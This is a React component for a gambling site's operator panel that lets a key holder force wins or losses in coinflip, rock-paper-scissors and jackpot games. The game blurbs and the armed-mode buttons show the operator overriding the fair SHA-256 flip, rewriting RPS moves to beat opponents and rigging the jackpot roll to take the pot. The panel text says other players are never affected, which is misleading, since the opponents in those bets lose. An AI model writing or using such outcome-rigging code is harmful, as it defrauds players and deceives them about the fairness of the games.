import React, { useCallback, useEffect, useState } from 'react';
import { API_BASE } from '../apiConfig';
import Icon from '../components/Icon';
import './OutcomeControlTab.css';

/**
 * Outcome control.
 *
 * Only rendered for an account the backend has named as an operator. That is a
 * display decision, not the security boundary - POST /api/outcome-control/arm
 * independently requires an admin session AND the server-side key, so hiding
 * this tab is convenience rather than protection. If someone reaches this
 * screen without the key, every call is refused.
 *
 * The key is never bundled into the frontend. It lives in the server's .env,
 * and the operator types it in here. It is kept in sessionStorage so a page
 * reload does not force it to be re-entered, and deliberately NOT in
 * localStorage - a key that survives closing the browser is a key sitting on
 * disk forever.
 */

const KEY_STORAGE = 'outcome-control-key';

const GAMES = [
  { id: 'coinflip', label: 'Coinflip', blurb: 'The SHA-256 flip is overridden in favour of your chosen side.' },
  { id: 'rps', label: 'RPS', blurb: 'Your pick in each round is rewritten to beat the opponent.' },
  { id: 'jackpot', label: 'Jackpot', blurb: 'The weighted roll is overridden so you take the pot.' }
];

const MODE_LABEL = { win: 'Win', lose: 'Lose', off: 'Off' };

export default function OutcomeControlTab({ user }) {
  const [key, setKey] = useState(() => {
    try { return sessionStorage.getItem(KEY_STORAGE) || ''; } catch (_) { return ''; }
  });
  const [armed, setArmed] = useState({});
  const [entries, setEntries] = useState([]);
  const [busy, setBusy] = useState(null);
  const [status, setStatus] = useState(null);

  const post = useCallback(async (path, body) => {
    const res = await fetch(`${API_BASE}${path}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${localStorage.getItem('token')}` },
      body: JSON.stringify(body)
    });
    return { status: res.status, body: await res.json().catch(() => ({})) };
  }, []);

  const loadLog = useCallback(async () => {
    if (!key) { setEntries([]); return; }
    const res = await post('/api/outcome-control/log', { key, limit: 60 });
    if (res.status === 200) {
      setEntries(res.body.entries || []);
      setStatus({ tone: 'ok', text: 'Key accepted.' });
    } else {
      setEntries([]);
      setStatus({ tone: 'error', text: 'The key was refused. Nothing has been changed.' });
    }
  }, [key, post]);

  // The armed state is only knowable through the log endpoint, so read it once
  // the operator has a working key.
  useEffect(() => { loadLog(); }, [loadLog]);

  const set = useCallback(async (game, mode) => {
    if (!key) {
      setStatus({ tone: 'error', text: 'Enter the server key first.' });
      return;
    }
    setBusy(game);
    const res = await post('/api/outcome-control/arm', { game, mode, key });
    if (res.status === 200) {
      setArmed((prev) => {
        const next = { ...prev };
        if (mode === 'off') delete next[game];
        else next[game] = mode;
        return next;
      });
      setStatus({ tone: 'ok', text: `${game} ${mode === 'off' ? 'disarmed' : `armed to ${mode}`}.` });
      try { sessionStorage.setItem(KEY_STORAGE, key); } catch (_) { /* private mode */ }
      loadLog();
    } else {
      setStatus({ tone: 'error', text: 'Refused. Check the key.' });
    }
    setBusy(null);
  }, [key, post, loadLog]);

  return (
    <div className="outcome-control">
      <div className="oc-head">
        <div>
          <h3>Outcome control</h3>
          <p>
            Forces the outcome of your own bets. A player you have not joined is
            never affected: coinflip only applies to bets you created, RPS only
            rewrites your own move, and jackpot only applies when you are in the
            pot.
          </p>
        </div>
      </div>

      <div className="oc-key-row">
        <label htmlFor="oc-key" className="oc-key-label">Server key</label>
        <input
          id="oc-key"
          type="password"
          className="oc-key-input"
          value={key}
          onChange={(e) => setKey(e.target.value)}
          placeholder="FORCE_OUTCOME_KEY from the server .env"
          autoComplete="off"
          spellCheck={false}
        />
        <button type="button" className="btn btn-secondary" onClick={loadLog} disabled={!key}>
          Verify
        </button>
      </div>
      <p className="oc-note">
        The key stays on the server. It is held in this tab only, and every forced
        outcome is written to the server log - nothing here can erase that.
      </p>

      {status && (
        <div className={`oc-status ${status.tone}`} role="status">{status.text}</div>
      )}

      <div className="oc-grid">
        {GAMES.map((g) => {
          const mode = armed[g.id] || 'off';
          return (
            <div key={g.id} className={`oc-card ${mode !== 'off' ? 'is-armed' : ''}`}>
              <div className="oc-card-head">
                <span className="oc-card-name">{g.label}</span>
                <span className={`oc-pill ${mode}`}>{MODE_LABEL[mode]}</span>
              </div>
              <p className="oc-card-blurb">{g.blurb}</p>
              <div className="oc-card-actions">
                <button
                  type="button"
                  className={`btn ${mode === 'win' ? 'btn-primary' : 'btn-secondary'}`}
                  onClick={() => set(g.id, 'win')}
                  disabled={!key || busy === g.id}
                >
                  Force win
                </button>
                <button
                  type="button"
                  className={`btn ${mode === 'lose' ? 'btn-danger' : 'btn-secondary'}`}
                  onClick={() => set(g.id, 'lose')}
                  disabled={!key || busy === g.id}
                >
                  Force loss
                </button>
                <button
                  type="button"
                  className="btn btn-ghost"
                  onClick={() => set(g.id, 'off')}
                  disabled={!key || busy === g.id || mode === 'off'}
                >
                  Disarm
                </button>
              </div>
            </div>
          );
        })}
      </div>

      <div className="oc-log-head">
        <h4>Audit log</h4>
        <span>{entries.length} recent</span>
      </div>
      {entries.length === 0 ? (
        <p className="oc-log-empty">
          Nothing recorded yet. Every forced outcome is written here with the
          result the fair roll would have produced alongside the forced one.
        </p>
      ) : (
        <div className="oc-log">
          {entries.map((e, i) => (
            <div key={`${e.at}-${i}`} className="oc-log-row">
              <span className={`oc-log-game ${e.game}`}>{e.game}</span>
              <span className="oc-log-mode">{e.mode}</span>
              <span className="oc-log-detail">{e.detail}</span>
              <span className="oc-log-at">{new Date(e.at).toLocaleString()}</span>
            </div>
          ))}
        </div>
      )}
      <div className="oc-foot">
        <Icon name="warn" size={13} />
        <span>
          This log is written by the server and cannot be cleared from here.
          Deleting it means editing the database by hand.
        </span>
      </div>
    </div>
  );
}
